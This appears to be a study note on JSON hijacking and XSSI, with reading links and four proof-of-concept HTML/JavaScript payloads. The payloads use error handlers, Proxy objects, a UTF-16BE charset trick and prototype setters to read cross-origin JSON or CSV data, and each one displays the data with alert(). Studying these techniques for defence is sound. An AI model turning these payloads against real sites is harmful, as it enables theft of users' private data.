###JSON Hijacking###

Read0: [Why Facebook's json response strats with...](https://dev.to/antogarand/why-facebooks-api-starts-with-a-for-loop-1eob)

Read1: [JSON Hijacking - Haacked](https://haacked.com/archive/2009/06/25/json-hijacking.aspx/)

Read1: [JSON hijacking for the modern web](https://portswigger.net/blog/json-hijacking-for-the-modern-web)

Read2: [Identifier based XSSI attacks](https://www.mbsd.jp/Whitepaper/xssi.pdf)

Read3: [AngularJS - json vulnerability protection](https://docs.angularjs.org/api/ng/service/$http#json-vulnerability-protection)

Read4: [JSONP](https://en.wikipedia.org/wiki/JSONP)

- Browser + Javascript Fault - from the way it parses json data in a javascript context.
- Bypassing SOP and access data within the javascript runtime
- CSV data can be hijacked as well (#2 below)
- JSONP (JSON-P, JSON Padding) - a javascript pattern to request data by loading a `<script>` tag


Some Samples from here and there

\#1

	<!-- set an error handler -->
	<SCRIPT>window.onerror = function(err) {alert(err)}</SCRIPT>
	<!-- load target CSV -->
	<SCRIPT src="(target data's URL)"></SCRIPT>


\#2	

	<!-- set proxy handler to window.__proto__ -->
	<SCRIPT>
	var handler = {
		 has: function(target, name) {alert("data=" + name); return true},
		 get: function(target, name) {return 1}
	};
	window.__proto__ = new Proxy({}, handler);
	</SCRIPT>
	<!-- load target CSV -->
	<SCRIPT src="(target data's URL)"></SCRIPT>

\#3

	<script> 
	__proto__.__proto__.__proto__.__proto__.__proto__=new Proxy(__proto__,{
    has:function f(target,name){
        var str = f.caller.toString();
        alert(str.replace(/./g,function(c){ c=c.charCodeAt(0);return String.fromCharCode(c>>8,c&0xff); }));
    }
	});
	</script>
	<script charset="UTF-16BE" src="external-script-with-array-literal"></script>
	<!-- script contains the following response: ["supersecret","abc"] -->	
	
\#4

	<script type="text/javascript"> 
        Object.prototype.__defineSetter__('Id', function(obj){alert(obj);});
    </script> 
    <script src="http://example.com/Home/AdminBalances"></script>

	